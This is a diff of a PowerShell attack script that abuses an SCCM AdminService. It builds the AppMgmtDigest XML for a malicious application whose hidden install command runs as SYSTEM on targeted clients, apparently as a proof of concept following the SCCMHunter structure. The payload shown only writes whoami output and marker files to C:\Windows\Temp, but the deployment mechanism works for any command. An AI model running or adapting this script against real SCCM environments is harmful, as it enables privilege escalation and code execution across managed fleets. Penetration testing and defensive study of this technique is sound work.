@@ -18,8 +18,12 @@ $base = "https://$mp/AdminService"
 $siteCode = 'CAD'
 $appName = 'WT038-PROOF-' + [guid]::NewGuid().ToString('N').Substring(0,8)
 $runas = 'System'
+$workingDir = ''
 # Payload command run on the client as SYSTEM
 $payload = "cmd /c `"whoami > C:\Windows\Temp\wt038-system.txt & echo WT038-PROOF-APP-DEPLOY > C:\Windows\Temp\wt038-marker.txt`""
+# XML-escape the payload (the > and & in cmd would break the model document otherwise)
+$payloadXml = [System.Security.SecurityElement]::Escape($payload)
+Write-Output ("  payloadXml=" + $payloadXml)
 
 function Invoke-AS($method, $path, $bodyJson) {
   $u = "$base/$path"
@@ -73,57 +77,112 @@ for ($i=1; $i -le 10; $i++) {
 }
 if (-not $inColl) { Write-Output '  [!] membership not visible after wait — continuing anyway' }
 
-# 5. Build AppMgmtDigest XML + create application
+# 5. Build AppMgmtDigest XML + create application (EXACT SCCMHunter structure — CustomData wrapper + Installer ExecutionContext required)
 $appID = "Application_" + [guid]::NewGuid().ToString('N')
 $deployID = "DeploymentType_" + [guid]::NewGuid().ToString('N')
 $fileID = "File_" + [guid]::NewGuid().ToString('N')
 Write-Output '[5] Build SDMPackageXML + create application'
 $methodBody = @"
-&lt;?xml version="1.0" encoding="utf-16"?&gt;&lt;EnhancedDetectionMethod xmlns="http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest"&gt;&lt;Settings xmlns="http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest"&gt;&lt;File Is64Bit="true" LogicalName="$fileID" xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/07/10/DesiredConfiguration"&gt;&lt;Annotation xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules"&gt;&lt;DisplayName Text=""/&gt;&lt;Description Text=""/&gt;&lt;/Annotation&gt;&lt;Path&gt;C:\&lt;/Path&gt;&lt;Filter&gt;asdf&lt;/Filter&gt;&lt;/File&gt;&lt;/Settings&gt;&lt;Rule id="$scopeID/$deployID" Severity="Informational" NonCompliantWhenSettingIsNotFound="false" xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules"&gt;&lt;Annotation&gt;&lt;DisplayName Text=""/&gt;&lt;Description Text=""/&gt;&lt;/Annotation&gt;&lt;Expression&gt;&lt;Operator&gt;NotEquals&lt;/Operator&gt;&lt;Operands&gt;&lt;SettingReference AuthoringScopeId="$scopeID" LogicalName="$fileID" Version="1" DataType="Int64" SettingLogicalName="$fileID" SettingSourceType="File" Method="Count" Changeable="false"/&gt;&lt;ConstantValue Value="0" DataType="Int64"/&gt;&lt;/Operands&gt;&lt;/Expression&gt;&lt;/Rule&gt;&lt;/EnhancedDetectionMethod&gt;
+&lt;?xml version="1.0" encoding="utf-16"?&gt;&lt;EnhancedDetectionMethod xmlns="http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest"&gt;&lt;Settings xmlns="http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest"&gt;&lt;File Is64Bit="true" LogicalName="$fileID" xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/07/10/DesiredConfiguration"&gt;&lt;Annotation xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules"&gt;&lt;DisplayName Text="" /&gt;&lt;Description Text="" /&gt;&lt;/Annotation&gt;&lt;Path&gt;C:\\&lt;/Path&gt;&lt;Filter&gt;asdf&lt;/Filter&gt;&lt;/File&gt;&lt;/Settings&gt;&lt;Rule id="$scopeID/$deployID" Severity="Informational" NonCompliantWhenSettingIsNotFound="false" xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules"&gt;&lt;Annotation&gt;&lt;DisplayName Text="" /&gt;&lt;Description Text="" /&gt;&lt;/Annotation&gt;&lt;Expression&gt;&lt;Operator&gt;NotEquals&lt;/Operator&gt;&lt;Operands&gt;&lt;SettingReference AuthoringScopeId="$scopeID" LogicalName="$appID" Version="1" DataType="Int64" SettingLogicalName="$fileID" SettingSourceType="File" Method="Count" Changeable="false" /&gt;&lt;ConstantValue Value="0" DataType="Int64" /&gt;&lt;/Operands&gt;&lt;/Expression&gt;&lt;/Rule&gt;&lt;/EnhancedDetectionMethod&gt;
 "@
 $xml = @"
 <?xml version="1.0" encoding="utf-16"?>
 <AppMgmtDigest xmlns="http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <Application AuthoringScopeId="$scopeID" LogicalName="$appID" Version="1">
-    <DisplayInfo DefaultLanguage="en-US"><Info Language="en-US"><Title>$appName</Title><Publisher/><Version/></Info><Description/></DisplayInfo>
-    <DeploymentTypes><DeploymentType AuthoringScopeId="$scopeID" LogicalName="$deployID" Version="1"/></DeploymentTypes>
+    <DisplayInfo DefaultLanguage="en-US">
+      <Info Language="en-US">
+        <Title>$appName</Title>
+        <Publisher/>
+        <Version/>
+      </Info>
+    </DisplayInfo>
+    <DeploymentTypes>
+      <DeploymentType AuthoringScopeId="$scopeID" LogicalName="$deployID" Version="1"/>
+    </DeploymentTypes>
     <Title ResourceId="Res_665624387">$appName</Title>
-    <Description ResourceId="Res_215018014"/><Publisher ResourceId="Res_433133800"/><SoftwareVersion ResourceId="Res_486536226"/><CustomId ResourceId="Res_167409166"/>
+    <Description ResourceId="Res_215018014"/>
+    <Publisher ResourceId="Res_433133800"/>
+    <SoftwareVersion ResourceId="Res_486536226"/>
+    <CustomId ResourceId="Res_167409166"/>
   </Application>
   <DeploymentType AuthoringScopeId="$scopeID" LogicalName="$deployID" Version="1">
     <Title ResourceId="Res_1643586251">$appName</Title>
     <Description ResourceId="Res_1438196005"/>
     <DeploymentTechnology>GLOBAL/ScriptDeploymentTechnology</DeploymentTechnology>
-    <Technology>Script</Technology><Hosting>Native</Hosting>
+    <Technology>Script</Technology>
+    <Hosting>Native</Hosting>
     <Installer Technology="Script">
-      <InstallAction><Provider>Script</Provider><Args>
-        <Arg Name="InstallCommandLine" Type="String">$payload</Arg>
-        <Arg Name="WorkingDirectory" Type="String"></Arg>
-        <Arg Name="ExecutionContext" Type="String">$runas</Arg>
-        <Arg Name="RequiresLogOn" Type="String"/>
-        <Arg Name="RequiresElevatedRights" Type="Boolean">false</Arg>
-        <Arg Name="RequiresUserInteraction" Type="Boolean">false</Arg>
-        <Arg Name="RequiresReboot" Type="Boolean">false</Arg>
-        <Arg Name="UserInteractionMode" Type="String">Hidden</Arg>
-        <Arg Name="PostInstallBehavior" Type="String">BasedOnExitCode</Arg>
-        <Arg Name="ExecuteTime" Type="Int32">0</Arg>
-        <Arg Name="MaxExecuteTime" Type="Int32">15</Arg>
-        <Arg Name="RunAs32Bit" Type="Boolean">false</Arg>
-        <Arg Name="SuccessExitCodes" Type="Int32[]"><Item>0</Item><Item>1707</Item></Arg>
-        <Arg Name="RebootExitCodes" Type="Int32[]"><Item>3010</Item></Arg>
-        <Arg Name="HardRebootExitCodes" Type="Int32[]"><Item>1641</Item></Arg>
-        <Arg Name="FastRetryExitCodes" Type="Int32[]"><Item>1618</Item></Arg>
-      </Args></InstallAction>
-      <DetectAction><Provider>Local</Provider><Args>
-        <Arg Name="ExecutionContext" Type="String">$runas</Arg>
-        <Arg Name="MethodBody" Type="String">$methodBody</Arg>
-      </Args></DetectAction>
-      <UninstallSetting>SameAsInstall</UninstallSetting>
-      <InstallFolder/><UninstallCommandLine/><UninstallFolder/>
-      <MaxExecuteTime>15</MaxExecuteTime>
-      <ExitCodes><ExitCode Code="0" Class="Success"/><ExitCode Code="1707" Class="Success"/><ExitCode Code="3010" Class="SoftReboot"/><ExitCode Code="1641" Class="HardReboot"/><ExitCode Code="1618" Class="FastRetry"/></ExitCodes>
-      <UserInteractionMode>Hidden</UserInteractionMode>
-      <AllowUninstall>true</AllowUninstall>
+      <ExecutionContext>$runas</ExecutionContext>
+      <DetectAction>
+        <Provider>Local</Provider>
+        <Args>
+          <Arg Name="ExecutionContext" Type="String">$runas</Arg>
+          <Arg Name="MethodBody" Type="String">$methodBody</Arg>
+        </Args>
+      </DetectAction>
+      <InstallAction>
+        <Provider>Script</Provider>
+        <Args>
+          <Arg Name="InstallCommandLine" Type="String">$payloadXml</Arg>
+          <Arg Name="WorkingDirectory" Type="String">$workingDir</Arg>
+          <Arg Name="ExecutionContext" Type="String">$runas</Arg>
+          <Arg Name="RequiresLogOn" Type="String"/>
+          <Arg Name="RequiresElevatedRights" Type="Boolean">false</Arg>
+          <Arg Name="RequiresUserInteraction" Type="Boolean">false</Arg>
+          <Arg Name="RequiresReboot" Type="Boolean">false</Arg>
+          <Arg Name="UserInteractionMode" Type="String">Hidden</Arg>
+          <Arg Name="PostInstallBehavior" Type="String">BasedOnExitCode</Arg>
+          <Arg Name="ExecuteTime" Type="Int32">0</Arg>
+          <Arg Name="MaxExecuteTime" Type="Int32">15</Arg>
+          <Arg Name="RunAs32Bit" Type="Boolean">false</Arg>
+          <Arg Name="SuccessExitCodes" Type="Int32[]"><Item>0</Item><Item>1707</Item></Arg>
+          <Arg Name="RebootExitCodes" Type="Int32[]"><Item>3010</Item></Arg>
+          <Arg Name="HardRebootExitCodes" Type="Int32[]"><Item>1641</Item></Arg>
+          <Arg Name="FastRetryExitCodes" Type="Int32[]"><Item>1618</Item></Arg>
+        </Args>
+      </InstallAction>
+      <CustomData>
+        <DetectionMethod>Enhanced</DetectionMethod>
+        <EnhancedDetectionMethod>
+          <Settings xmlns="http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest">
+            <File xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/07/10/DesiredConfiguration" Is64Bit="true" LogicalName="$fileID">
+              <Annotation xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules">
+                <DisplayName Text=""/>
+                <Description Text=""/>
+              </Annotation>
+              <Path>C:\\</Path>
+              <Filter>asdf</Filter>
+            </File>
+          </Settings>
+          <Rule xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules" id="$scopeID/$deployID" Severity="Informational" NonCompliantWhenSettingIsNotFound="false">
+            <Annotation>
+              <DisplayName Text=""/><Description Text=""/>
+            </Annotation>
+            <Expression>
+              <Operator>NotEquals</Operator>
+              <Operands>
+                <SettingReference AuthoringScopeId="$scopeID" LogicalName="$appID" Version="1" DataType="Int64" SettingLogicalName="$fileID" SettingSourceType="File" Method="Count" Changeable="false"/>
+                <ConstantValue Value="0" DataType="Int64"/>
+              </Operands>
+            </Expression>
+          </Rule>
+        </EnhancedDetectionMethod>
+        <InstallCommandLine>$payloadXml</InstallCommandLine>
+        <UninstallSetting>SameAsInstall</UninstallSetting>
+        <InstallFolder/>
+        <UninstallCommandLine/>
+        <UninstallFolder/>
+        <MaxExecuteTime>15</MaxExecuteTime>
+        <ExitCodes>
+          <ExitCode Code="0" Class="Success"/>
+          <ExitCode Code="1707" Class="Success"/>
+          <ExitCode Code="3010" Class="SoftReboot"/>
+          <ExitCode Code="1641" Class="HardReboot"/>
+          <ExitCode Code="1618" Class="FastRetry"/>
+        </ExitCodes>
+        <UserInteractionMode>Hidden</UserInteractionMode>
+        <AllowUninstall>true</AllowUninstall>
+      </CustomData>
     </Installer>
   </DeploymentType>
 </AppMgmtDigest>
